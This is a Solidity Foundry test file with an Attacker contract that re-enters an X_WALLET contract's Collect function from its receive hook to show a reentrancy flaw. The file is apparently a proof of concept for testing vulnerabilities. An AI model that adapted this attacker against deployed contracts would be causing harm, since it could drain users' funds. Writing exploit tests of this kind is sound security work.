
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/X_WALLET.sol";

contract TestReentrancyX_WALLET is Test {
    X_WALLET public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new X_WALLET(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        // MinSum is 1 ether. We need to withdraw at least MinSum.
        vm.assume(attackVal >= 1 ether);
        // Ensure we don't overflow when calculating funding requirements
        vm.assume(attackVal < type(uint128).max);

        // --- 2. State Configuration (Pre-Condition) ---
        // No specific state needed on victim before attack setup, 
        // but we need to handle time constraints later.

        // --- 3. Funding ---
        // Fund the Victim (so it has ETH to steal/withdraw)
        // We fund it with enough to cover the withdrawals.
        vm.deal(address(_contractUnderTest), attackVal * 10); 
        
        // Fund the Test Contract (address(this))
        // We need enough to fund the attacker with 2x attackVal to demonstrate 
        // reentrancy without underflow in 0.8.x (since we can't drain extra funds due to overflow protection).
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        // We deposit 2 * attackVal.
        // We will try to withdraw attackVal twice.
        // This proves reentrancy (control flow) even if 0.8.x prevents theft.
        _attacker.setupAttack{value: attackVal * 2}(attackVal);
        
        // Warp time to satisfy block.timestamp > unlockTime
        // Put(0) sets unlockTime to block.timestamp.
        vm.warp(block.timestamp + 10);

        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    X_WALLET public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public amountToWithdraw;

    constructor(address victimAddress) { 
        victim = X_WALLET(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        amountToWithdraw = val;
        
        // Deposit funds. We deposit msg.value (which is 2 * val from the test setup)
        // unlockTime 0 sets it to current block.timestamp
        victim.Put{value: msg.value}(0);
    }

    function attack(uint256 val) public {
        attackCallCount = 1;
        
        // Call the vulnerable function
        victim.Collect(val);

        // Verify Success Conditions
        // If we successfully re-entered, attackCallCount should be 2.
        if (attackCallCount == 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            // Increment attackCallCount to track the reentrancy depth
            attackCallCount++;
            
            // Re-enter the contract
            victim.Collect(amountToWithdraw);
        }
    }
}
